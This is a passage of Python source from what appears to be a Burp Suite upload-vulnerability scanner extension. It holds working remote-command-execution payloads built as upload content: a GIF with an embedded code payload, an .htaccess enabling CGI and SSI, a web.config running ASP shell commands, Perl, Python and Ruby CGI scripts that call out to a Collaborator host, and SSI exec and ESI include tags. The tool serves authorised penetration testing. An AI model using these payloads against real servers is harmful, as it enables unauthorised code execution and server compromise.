                    'Ctit7zJmGdsKDDohv2H0ahCjGN+gOCKST2tRHaHoJulDzeHwc5FVP/DnOsY7HvFvrlTk5sEZcYl5b+df7i4TMJS0AV+Cc55qGdjGATne7m34a' \
                    'qE+96U1PdypIPOkyoEDgS+CKOq878TtYvO7PweGsQ97k7LldZsdn75ajohZMFG87RCeAFxhg2c5eAbShnYApWP/6U5j4pyeO/exXv/rST3r/m' \
                    'cFdAgjU+Ry4z/3u19F4yPze5G4lKu6+bvmWY76J1VtmAWCgh7qxHedvRwGBgGY/UIA/oAlWYAWaMAXTkFUImICaEIEFOIB5kAeBZwBtR3ggtA' \
                    '6NsHu6tw6Mdw6u0HsS8X6R13VTBnZWhgrHx0dAQGwXsH9YoAevUHM3l3PKdgTycGPTlAOx5QCtAAgNCFsN0GANEFvWZV3BIHAY+HQCMAlaAAH' \
                    'op34fyH7sBwGY4H4meBfLgIIkdmjF52ssWAvtUFA6cAcvEIMwgAUzWAl1FnADp4PT5AAi4A7uEAhC91pFGDcsoDENsFpLaACDYGxBAANakAkQ' \
                    'sA47AIKMZ4VX/wgBmYB1JbiFdrEMkwdJKxeGTzCG++BHvDABy5cJMqgHeuCGyHYEy5YHfnAGURBbSzB331AMVtAAEiAiG8ACFrJaBlAG41YJh' \
                    'mgIiOiIwrgOEFCMEMBej0eJXAEMl4g7mZhoYsiCBcA6HpBYKnQH7ZCG+7eGNKh2lGZpqsiKpjBxQBeLmtAAl4APdjgIzXFH4iYAlQCFh1iMVt' \
                    'iIxkiPxegKskZyymgUSdCM9UVlYciCLEgDfyRFgTQBL6CNaziDNdh8YpYHkiAD0rdw5tgAKKAKqvCHaOAcmVBzk2CIiCiFjUiMiXiPKEkDv6C' \
                    'F/cgVUDB5ulZv0EiQqCAKihVWLf+QhpmgBdxIg3VDYzFQcHEHdFmFkfqykfLAA3WTBoYYD8E4jCgZlRAgCi0UES3ZFZ7ABhESkyoYjSz4BRMg' \
                    'RQipUN/EW2loCDw5gz4ZBBUYCBSwBKbAYwkwi6wyCCjAD0EgAEypBcBIj8IolVJJBjsBF1fJFWPDlQtUBIq5mIzZmI75mOwQmXswmZMpAKkgD' \
                    '36QY4EABhI3i77gC4MwCB+5B5HJDo95mqiZmqq5mqzZmq75mrC5mvGHmBhQBIxwm7iZm7q5m7oJArAAC0YgCH9AB3EwArfgAwQWDMFwBkvQmQ' \
                    '0wBwcwB4MgACMgCEbwmyDAm9q5ndzZnd75neAZnuL/OZ7cWQSzOX/3VQQEQAAP8ACMwJ4EwAgPEJ/vyZ7zKZ/0KZ/zGZ+/aQR/cAjF+QoQUF3' \
                    'WFQjZdwbzMQeLkAZGEAYgkJ3uuZ742Z73SZ/iQJ8PcKEReqHyeZsSSp/xGaLr6Z7z2Z7v+Z73WZ8RiqGMcKEimqH1OaL7OaPrGaIm2qEtKqEV' \
                    'mps1CqIeup8nyp4daqP1eZvmqZVbQpvq6aI9up5M2qQySgAaOqKMAJz/aZw+oAJloFpXNQVnUAbOMQcCsAqwEKM1aqY9mqFPCp/7OaJpCqVSC' \
                    'qVtuqZs2qRtCqV0WqMueqc9Kg7zuadwGqfw6aSBeqdTyp4uWgRC1Tjy/xeQm6WeBBAAARCpkwqllQqnkyqpPQoLgmAHxakHWVBVLCVNW8qLMA' \
                    'AL63mplBqokcqqrtqjqgqrrwqrmRqosVqjmtqqqTqrrVqrs5qpt+qqigqQK1cEwNqrwDoDlFqrkqqsq1qpAQACYfCfxSkAusAKrFAG0TQEWzq' \
                    'dkAACy9qsksqsATAD4yqu55qu44qs4aqp6tquwOqu6rquBGCu7kqp9pqq5Wqv8dqv6aqs5xqukcqvuwqt6wqsw8qomKhZtXmu7yCpDzuvEJuu' \
                    'EVuxkwqcnjoCejAK+jQHS1AF3FoGa1AAsBAAEWuyEPuwJ5uyJnuyK2uxLfsOMjux46qyLP+Lsi2LszSrsjYrszYbsxPrsyvrsDS7szUrsTmrr' \
                    'hVrsQ+bsPSWmEIbtVI7tVTrsw8QBoJAnCMgAIgAB6BwYCVQBqogAEYAAlUbtTF7tmq7tjPLtm4rtWn7tm+bs1MbtzyLtorqhcbVBEUgs3iAB+' \
                    '/wt4H7t4RLuCYAuH97uIkbuD6LB9FqBHZwCCNAA/YwR2cABm03CvtgtopbuHiguKALuIdrAu/QuYDLuJ/rt4YbuIqruqPruYQ7uKZruKT7ubY' \
                    '7uLaLuKmbu7Cru4aLuK2buqQru7ubu65burG7uKWbt7kGV71TBHjgBXjwBl7wBtErvdb7t9lLuNvrBd77t9X/q70B4ARZW61uIAYOEAMlgA8+' \
                    'AAviIL3gG7/ga73067nd27vWC7/ce7/bq72Ei73UC7vSG77R+7+eC7/Zm78J7L/cC7v5y8D/27/928DfK7/Ty7xbiZ5oUwRv0MEdPAAD8MFvA' \
                    'MIg7MEmXMIhHMIeHMJ4IK3UegsbdAr3UAI+0AMPML0kvMIj/MEovMMjrMIq7MMpvMJDDMQ/HMQ8bMIirMRFrMMnnMI9vMNBjMRKvMQl7MM8fM' \
                    'VYHMVY/MNFcCXN+IUbrAgkrAhmbMYgTMZnvMZpvMZnPABqrAh44ARGoLU+YA+gcARdUAkP8A5uHMdv7MZl/Md/DMeBDMeGTMaI/0zIaKzGg6z' \
                    'IjYzGg7zIgVzIjCzIb2zIbVzJjxzJmbzGX4xyGEViX1cEC7DGC2AGqawIp3zGZmAGrgzLr+zGC7DKZjy+wxkHKcC1JTCmfgzLijDLfyzLqEzM' \
                    'wczKwSzLwMzKtazKqpzMwdzKy8zKqnzKzZzMsCzNZ3zKr7zKryzMspzKyyzM26zMrZzM3jzL2UzM3ZzKtezK4rzMpxzK5+mopowNtZzPC4DP+' \
                    '4zP/KzP/wzQ/ZzPAwACkAuglWAPL5AG+YAM+RzQ+rzPEQ3RtczP2EDREV3REp3RHH3RAG3RGD3QG23RGv3Q/nzRJ/3P/izQHj3RD53RKx3Q2E' \
                    'DPYf+8UUWA0hddDijtCDmN0+iADaRw0ZyA0kHtCD+t0zwN1I9AvsS5ywIACY8A1KTACVSN0zkd1FMt1UF90aTQ1Ty91VaN1UJ90Ue91UMN1I4' \
                    'w1KTw01LN1VNdDlmt1VzNCViN1We91iit02CNDWdd1Wet0+gw1HeN06TgCF+NDXBN2OjQ1VZN11Y901HWvEZVBIZt2Axg2ZxQ2Zp92ZftCJed' \
                    '2ZzNCQzAAIU92oaNDfkwrYdAB1gAAyaADJ4d22nN2bPt2Z0N2ppt2Z092qBt2rJt2bE92qYt3J3926Kt2wwg2sVt2Li92Zzt28tN29Kd259d2' \
                    'cMt3L9t3bb93MNt24b//cW4lsH1hQtFwAAZcN7ofd7mjd4nsN4ZcAInkAHCnd7o7d7xjQx0/Ad/YAQNLd/qfd7wHd/0Xd/+/d7pvd7tXeD03d' \
                    '7uTd/mHd8MIOD+bd72PeAFTuH/7eD/HeHyjeEPPuDr3eASHuLvLeEHnuAA/uARXgTxVWiUR96UQAkZEOPoTeMyLuMznuM6HuM3zuP0LeNLbQR' \
                    'G4ASPMAs97uM5buMzjuM1buM87uNPfuRRTuNJft443uNJLuVHvuROruQ3vuTpHeVWLuU6XuNc3uVPXuZQHuUsHmIYNX9FsAmU4AKbIOcu4AIx' \
                    'jud4XuebQOdy/ud0HuiUUOeD3ueGPguP/5AP+VDkfI7ng07nc27ngz7ndy7nk77nkH7nes7nPM7plU7pe+7pde7nhX7phc7now7olg7pp+7nf' \
                    't7nPE7qjU7oo67pqD7pfz7rkc7qtd7oc97muKaw6+IPcb4JRGDsmyAFREAEyn7syy4Fdc7szr7szM7n1Z7s0M7sLjAL3B7py27sxw7tyU7t4C' \
                    '4FzU7tzG7uyr7u0Z7u1J7t6/7t1Z7t5E7vyg7uyC7t1s7nzd7v0q7vx47s7a7v+X7uyY7v4w7wxm7u157tC1/n/c7nLG5AUg=='
            start = start.decode("base64")
            end = '8RgvBc2gDSEP8hoP8iT/8Rxf8uYe8tZQ8h7f8S6/8eP/sPIkL/LaQPMhPw4i3/Egrw03X/I7b/JSsPMeL/LmfvNSwPFEP/Qqj/HjkPIwf/Ib//JF' \
                  'n/LWQPI1P/VE//Iz7/E93ww6n/RND/JQH/MvP/EhJuyyUATUQA3aEA3mYA7W8PbR0AzREA3WEA10P/fjQA16Tw3W0PbWkA54n/dtHw1uH/h3//Z' \
                  'tz/h6bw1y//aQf/d4//bm0PfjkPeI3/Zy3wzWYPja0PbpEPiHb/dwrw2kH/h5b/ibP/hwr/mC7/PpYA6V7/eLv/mID/uSD/h3z/p6z/htH/y8f/' \
                  'e2j/g+7/efX/iA7/qUD/jLz/uKTw0TH1+LmsFFoADRoAAKUA3c/6/93r/9218N2D/+2C/+2a/94o/+3t/96y/+6f/966/+8J/979/+2h8N9W/+C' \
                  'gAP4Q8QCgQOJFhNQTWEAg0SVHiQYbRoDhk2HJiQ4sKFDDEOjNgwY8GODjNmjFYEwUl9+oTYYuMJShJgNYqQ+ESChIJPAmneVECzZ86cNml+IlrT' \
                  'pkCiP2sCrYnz502jS30SHUpVKFWcSXVODYqUadaiQZdGjYq0p9OhN4XuZLvz7E+cbsUOHBqXK9Wib9veLVtE3UkEKVe6fAmsSKFPhQpB+wQNsWL' \
                  'FjRk7VkzZMbTLiIlCpowYc+bEkT9vblw6MePFixOXzuw5dWjIpzsvnk37Mf/mx5wrf4ac2vbp1bkr+84dfDLv4LlRgw7tmHRvaH4BC2ZJOEmRZ9' \
                  'm5QQsHLfszaNy4PRu//TO3cOAxZ/dOfn37Z93Bp08PXrt39Oq9c4/vfv/n79gTz70A7UvvPfXCObC++NrbL8Dx3KMvvADh+4y+A/UbDz77+otQv' \
                  'ULIizA/AdmjkD/1susuHL/+QkklWzwhrIhrrqmAmwqu4eaaYYbhsYIKfORRR3BqvOaZYYpMssZhgqzxmR+BTLLHHcFJEspnguzxxiGBzPGZIrlp' \
                  'ckkcbexxyTFrLNLKI8Epc8phwIQSHDfZ5EZJK5tU8shr9uzxxyGLNDLLOPsEJ8gK6Dz/cssch9TRyBwPrQDKQSElMlAhoWxxOpUGgwKKIoYJocd' \
                  'RRTV11BBSLXVVUlk9M9VXUX311FbPnJXUW3E1tVZbe+3VVVhFlVVYX1W9VdZShV012VxtHZZZZZ31dVpUjR2mRRcD67QlUFUNgQkAvGWCCW+/FT' \
                  'dVctEtd1xV01U3XXjJhbdcdc+tN9526W3XXXbf3Tdcftc1t95vxyUXAHnN5ZdfgAcOIdyC55XXXYfzrRdbwLRdqaUixgUAYYPBBfdjhEsemWSUT' \
                  'xb5Y4NZBnlkmE32GGWXSVaZZphXXpnlmUv+mJCYa075ZJ93phlnnWX2eOmga+75aJNxLhrbbFOC/5GNIm4A4AZCfv6Ya0LCFnvsG7g2u2ywzQZA' \
                  'bLXL3npts8PWmuyy2V577a7JDvvuseEmmZC488477a3B3rtuwcdOXGy4Affb8bzx7trwvftGvOufKU98a8fxNnxtqqvu1Jaszw6bGcBTv4EZZ9i' \
                  'u+wZnYK8bdUJij7v11mU32/baewdcd7Z/z71sZ4YHPPbeDWcGbbSXL172sJ+3PfffVYeeeNlZP9t22JGfHvHLVz/emeXFRx7t4qPXPX3ka2ce8N' \
                  'AzFkyIIli3n3Xy7+9GGmZY76Z/8pGPf/4rXv8MaMAA8s8Z/FOgNALYjeI543//y1//FLjA4kFwgf3rxv8cmNm/CBaQggZ0oAH/h78KDrCD+YMgM' \
                  'ygoQRcKEIQPXKA0BrjBDWrQhswoYfEYaL8QcrCALhRiB3l4wRKGLlsaK4I3pvG/b3iDh/2bBuvIQUVnOHEa3vgG66TRjWl84xs2JN80yCGNaUhD' \
                  'imZ0ojf2h8Y0MnCMbVRjFKVxxTTyMI1xnMYe0ciMKzrQhl1sozfQ6A0n9q+LNnTiN6qIxi92sYqPTGM3xshDb5yRGVrsYxv/18ct9rEb5HDkFpk' \
                  'RSkOSA4yb7OMY0XjGPLqxj0fkXx8POUBGIpIZRQgIADs='
            end = end.decode("base64")
            content = start + payload_exact_13_len + end
            expected_download_content = start + expect + end
            title = lang + " code injection" # via GIF Content"
            desc = "Remote command execution through {} payload in GIF image format analogous to https://www.secgeek.net/bookfresh" \
                   "-vulnerability/#comment-331 . The server replaced the code {} inside the uploaded image with {}, meaning that " \
                   "{} code execution seems possible. This image survives PHP's getimagesize() and imagecreatefromgif(), therefore" \
                   " it is likely that in general the part where the payload was injected into the image might survive other " \
                   "conversions too.".format(lang, cgi.escape(payload_exact_13_len), expect, lang)
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Certain", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expected_download_content))
            self._send_simple(injector, types, basename, content, redownload=True)

    def _htaccess(self, injector, burp_colab):
        htaccess = ".htaccess"
        title = ".htaccess upload"
        content = "Options +Indexes +Includes +ExecCGI\n" \
                  "AddHandler cgi-script .cgi .pl .py .rb\n" \
                  "AddHandler server-parsed .shtml .stm .shtm .html .jpeg .png .mp4\n" \
                  "AddOutputFilter INCLUDES .shtml .stm .shtm .html .jpeg .png .mp4\n"
        desc = ".htaccess files can be used to do folder specific configurations in Apache. A filename of {} was " \
               "uploaded with content '{}' and detected that the page later on includes the string 'Index of /'. " \
               "This could mean that the .htaccess we uploaded enabled a directory listing. Additionally it enabled " \
               "server side includes, if you can upload files with a server side include extension they can now be " \
               "executed. ".format(htaccess, content)
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Medium")

        urrs = self._send_simple(injector, self.HTACCESS_TYPES, htaccess, content, redownload=True, randomize=False)
        # We only need to do this for one, not for all
        urr = urrs[0]
        if urr and urr.download_rr:
            url = FloydsHelpers.u2s(self._helpers.analyzeRequest(urr.download_rr).getUrl().toString())
            try:
                path = urlparse.urlparse(url).path
            except ValueError:
                # Catch https://github.com/modzero/mod0BurpUploadScanner/issues/12
                path = None
            if path:
                path_no_filename = path.rsplit("/", 1)[0] + "/"
                self.dl_matchers.add(DownloadMatcher(issue, filecontent="Index of /", url_content=path_no_filename))
                self._send_get_request(urr.download_rr, path_no_filename, injector.opts.create_log)

        if not burp_colab:
            return []

        # Interesting way with a web.config file
        return self._htaccess_asp_web_config(injector, burp_colab)

    def _htaccess_asp_web_config(self, injector, burp_colab):
        colab_tests = []

        one = ''.join(random.sample(string.ascii_letters, 8))
        two = ''.join(random.sample(string.ascii_letters, 8))
        three = ''.join(random.sample(string.ascii_letters, 8))

        # create replace list and file that executes all rce commands at once
        replace_list = []
        command_names = []
        commands = ""
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            replace_list.append(replace)
            command_names.append(cmd_name)
            commands += 'Set wShell1 = CreateObject("WScript.Shell")\n'
            commands += 'Set cmd1 = wShell1.Exec("{} {}")\n'.format(cmd, server)

        content = """<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!--
<%
a = "{}"
b = "{}"
c = "{}"
Response.write("-"&"->")
Response.write(a&c&b)
{}
%>
-->""".format(one, two, three, commands)
        expect = one + three + two

        basename = "web"
        types = {
            ('', '.config::$DATA', ''),
            ('', '.config', '')
        }
        title = "Web.config RCE"
        base_detail = 'The server executes web.config files that are uploaded, which results in a Remote Command Execution (RCE). <br>' \
                      'See https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/ .'
        detail_download = "A web.config file was uploaded and in the download the ASP concatenation of three variables was " \
                          "replaced with {} only. <br><br> {} <br>".format(expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a web.config file executing {} for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(", ".join(command_names), base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self._send_simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self._send_collaborator(injector, burp_colab, types, basename, content, issue_colab,
                                                   redownload=True, replace=replace_list, randomize=False))

        return colab_tests

    def _cgi(self, injector, burp_colab):
        colab_tests = []

        if not burp_colab:
            return []

        # Do not forget, for CGI to work, the files have to be executable (chmod +x), which will not be the case
        # for a lot of servers...
        # Therefore additional sleep based payloads would not make sense

        rand_a = ''.join(random.sample(string.ascii_letters, 20))
        rand_b = ''.join(random.sample(string.ascii_letters, 20))
        expect = rand_a + rand_b
        # create replace list and file that executes all rce commands at once
        replace_list = []
        command_names = []
        commands = ""
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            replace_list.append(replace)
            command_names.append(cmd_name)
            commands += "`{} {}`;\n".format(cmd, server)

        # Do NOT print a status header (HTTP/1.0 200 OK) for perl
        content_perl = "#!/usr/bin/env perl\n" \
                       "print \"Content-type: text/html\\n\\n\"\n" \
                       "{}" \
                       "local ($k);\n" \
                       "$k = \"{}\";\n" \
                       "print $k . \"{}\";".format(commands, rand_a, rand_b)
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Perl"
        title = "Perl code injection"
        base_detail = 'The server executes Perl files that are uploaded, which results in a Remote Command Execution (RCE). '
        detail_download = "A Perl file was uploaded and in the download the code $k = '{}'; print $k . '{}'; was " \
                          "replaced with {} only. <br><br> {} <br>".format(rand_a, rand_b, expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a Perl file executing {} for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(", ".join(command_names), base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self._send_simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.PL_TYPES, basename, content_perl, issue_colab,
                                               redownload=True, replace=replace_list))


        rand_a = ''.join(random.sample(string.ascii_letters, 20))
        rand_b = ''.join(random.sample(string.ascii_letters, 20))
        expect = rand_a + rand_b
        # create DNS or IP Collaborator URl
        if burp_colab.is_ip_collaborator:
            python3_url = "http://test.example.org/Python3"
            python2_url = "http://test.example.org/Python2"
        else:
            python3_url = "http://python3.test.example.org/Python3"
            python2_url = "http://python2.test.example.org/Python2"

        # Do NOT print a status header (HTTP/1.0 200 OK) for python
        content_python = "#!/usr/bin/env python\n" \
                       "import sys\n" \
                       "print 'Content-type: text/html\\n\\n'\n" \
                       "if sys.version_info >= (3, 0):\n" \
                       "  import urllib.request\n" \
                       "  urllib.request.urlopen('{}').read()\n" \
                       "else:\n" \
                       "  import urllib2\n" \
                       "  urllib2.urlopen('{}').read()\n" \
                       "k = '{}'\n" \
                       "print k + '{}'".format(python3_url, python2_url, rand_a, rand_b)
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Python"
        title = "Python code injection"
        base_detail = 'The server executes Python files that are uploaded, which results in a Remote Command Execution (RCE). '
        detail_download = "A Python file was uploaded and in the download the code k = '{}'; print k + '{}'; was " \
                          "replaced with {} only. <br><br> {} <br>".format(rand_a, rand_b, expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a Python file executing a GET request for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self._send_simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.PY_TYPES, basename, content_python, issue_colab,
                                                   redownload=True, replace="test.example.org"))


        rand_a = ''.join(random.sample(string.ascii_letters, 20))
        rand_b = ''.join(random.sample(string.ascii_letters, 20))
        expect = rand_a + rand_b
        # create DNS or IP Collaborator URl
        if burp_colab.is_ip_collaborator:
            ruby_url = "http://test.example.org/Ruby"
        else:
            ruby_url = "http://ruby.test.example.org/Ruby"
        # Do NOT print a status header (HTTP/1.0 200 OK) for ruby
        content_ruby1 = "#!/usr/bin/env ruby\n" \
                       "require 'net/http'\n" \
                       "puts \"Content-type: text/html\\n\\n\"\n" \
                       "url=URI.parse('{}')\n" \
                       "req=Net::HTTP::Get.new(url.to_s)\n" \
                       "Net::HTTP.start(url.host,url.port){|http|http.request(req)}\n"
        content_ruby2 = "k = \"{}\"\n" \
                       "puts k + \"{}\"".format(ruby_url, rand_a, rand_b)
        content_ruby = content_ruby1 + content_ruby2
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Ruby"
        title = "Ruby code injection"
        base_detail = 'The server executes Ruby files that are uploaded, which results in a Remote Command Execution (RCE). '
        detail_download = "A Ruby file was uploaded and in the download the code k = \"{}\"; puts k + \"{}\"; was " \
                          "replaced with {} only. <br><br> {} <br>".format(rand_a, rand_b, expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a Ruby file executing a GET request for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self._send_simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.RB_TYPES, basename, content_ruby, issue_colab,
                                                   redownload=True, replace="test.example.org"))

        # Not going to add as a feature: elf binary .cgi files
        # If those work, then Python or Perl works in most cases too...

        return colab_tests

    def _ssi_payload(self):
        non_existant_domain = "{}.{}.local".format(str(random.randint(100000, 999999)), str(random.randint(100000, 999999)))
        expect = " can't find " + non_existant_domain
        content = '<!--#exec cmd="nslookup ' + non_existant_domain + '" -->'
        return content, expect

    def _ssi(self, injector, burp_colab):
        issue_name = "SSI injection"
        severity = "High"
        confidence = "Certain"

        # Reflected nslookup
        # This might fail if the DNS is responding with default DNS entries, then it won't say "can't find" and the
        # domain but I couldn't come up with anything better for SSI except Burp collaborator payloads and this...
        # At least "can't find" + domain is present in Linux and Windows nslookup output
        main_detail = "A certain string was dectected when uploading and downloading an Server Side Include file with a " \
                      "payload that executes commands with nslookup. Therefore arbitrary command execution seems possible. " \
                      "Note that if you enabled the .htaccess module as well, this attack might have only succeeded because " \
                      "we were already able to upload a .htaccess file that enables SSI. The payload in this attack was: " \
                      "<br><br>{}<br><br> The found string in a response was: " \
                      "<br>{}<br><br>"

        # Reflected nslookup - Simple
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectDnsSimple"
        content, expect = self._ssi_payload()
        detail = main_detail.format(cgi.escape(content), cgi.escape(expect))
        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
        self._send_simple(injector, self.SSI_TYPES, basename, content, redownload=True)

        # Reflected nslookup - File metadata
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, self._ssi_payload):
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectDns" + name
            detail = main_detail + "In this case the payload was injected into a file with metatadata of type {}."
            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
            self._send_simple(injector, self.SSI_TYPES, basename, content, redownload=True)

        # TODO: Decide if additional sleep based payloads would make sense, probably rather not

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []

        colab_tests = []

        # RCE with Burp collaborator
        base_detail = "A burp collaborator interaction was dectected when uploading an Server Side Include file with a payload that " \
                "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. Note that if " \
                "you enabled the .htaccess module as well, this attack might have only succeeded because we were " \
                "already able to upload a .htaccess file that enables SSI. "

        # RCE with Burp collaborator - Simple
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiColab" + cmd_name
            content = '<!--#exec cmd="{} {}" -->'.format(cmd, server)
            detail = "{}A {} payload was used. <br>Interactions: <br><br>".format(base_detail, cmd_name)
            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SSI_TYPES, basename,
                                                       content, issue, replace=replace, redownload=True))

        # RCE with Burp collaborator - File metadata
        # For SSI backdoored files we only use the first payload type (either nslookup or wget)
        # as otherwise we run into a combinatoric explosion with payload types multiplied with exiftool techniques
        base_desc = 'Remote command execution through SSI payload in Metadata of type {}. The server executed a SSI ' \
                    'Burp Collaborator payload with {} inside the uploaded file. ' \
                    '<br>Interactions: <br><br>'
        cmd_name, cmd, server, replace = next(iter(self._get_rce_interaction_commands(injector, burp_colab)))
        ssicolab = SsiPayloadGenerator(burp_colab, cmd, server, replace)
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, _, name, ext, content in bi.get_files(size, ssicolab.payload_func):
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiBfRce" + name
            desc = base_desc.format(cgi.escape(name), cgi.escape(cmd_name))
            issue = self._create_issue_template(injector.get_brr(), issue_name, base_detail + desc, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SSI_TYPES, basename,
                                                       content, issue, replace=ssicolab.placeholder, redownload=True))

        return colab_tests

    def _esi_payload(self):
        one = ''.join(random.sample(string.ascii_letters, 5))
        two = ''.join(random.sample(string.ascii_letters, 5))
        three = ''.join(random.sample(string.ascii_letters, 5))
        content = '{}<!--esi-->{}<!--esx-->{}'.format(one, two, three)
        expect = '{}{}<!--esx-->{}'.format(one, two, three)
        return content, expect

    def _esi(self, injector, burp_colab):
        issue_name = "ESI injection"
        severity = "High"
        confidence = "Certain"

        # Reflected stripped esi tag
        base_detail = "When uploading an Edge Side Include file with a payload of {}, the server later responded with " \
                      "{} only. This means that ESI might be enabled. The payload was an Edge Side Include (ESI) tag, see " \
                      "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. "

        # Reflected stripped esi tag - Simple
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiReflectSimple"
        content, expect = self._esi_payload()
        detail = base_detail.format(cgi.escape(content), cgi.escape(expect))
        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
        self._send_simple(injector, self.ESI_TYPES, basename, content, redownload=True)

        # Reflected nslookup - File metadata
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, self._esi_payload):
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiReflect" + name
            detail = base_detail + "In this case the payload was injected into a file with metatadata of type {}."
            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
            self._send_simple(injector, self.ESI_TYPES, basename, content, redownload=True)

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []

        colab_tests = []

        # ESI injection - includes remote URL -> burp collaborator
        # According to feedback on https://github.com/modzero/mod0BurpUploadScanner/issues/11
        # this is unlikely to be successfully triggered
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiColab"
        content = '<esi:include src="{}1.html" alt="{}" onerror="continue"/>'.format(BurpExtender.MARKER_COLLAB_URL, BurpExtender.MARKER_CACHE_DEFEAT_URL)
        detail = "A burp collaborator interaction was dectected when uploading an Edge Side Include file with a payload that " \
                 "includes a burp collaborator URL. The payload was an Edge Side Include (ESI) tag, see " \
                 "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. As it is unlikely " \
                 "that ESI attacks result in successful Burp Collaborator interactions, this is also likely to " \
                 "be a Squid proxy, which is one of the few proxies that support that.<br>Interactions: <br><br>"
        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.ESI_TYPES, basename,
                                                   content, issue, redownload=True))

        # Not doing the metadata file + Burp Collaborator approach here, as that seems to be a waste of requests as explained
        # on https://github.com/modzero/mod0BurpUploadScanner/issues/11

        return colab_tests

    def _xxe_svg_external_image(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['svg'].isSelected():
            root_tag = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>'
            text_tag = '<text x="0" y="20" font-size="20">test</text>'
            # The standard file we are going to use for the tests:
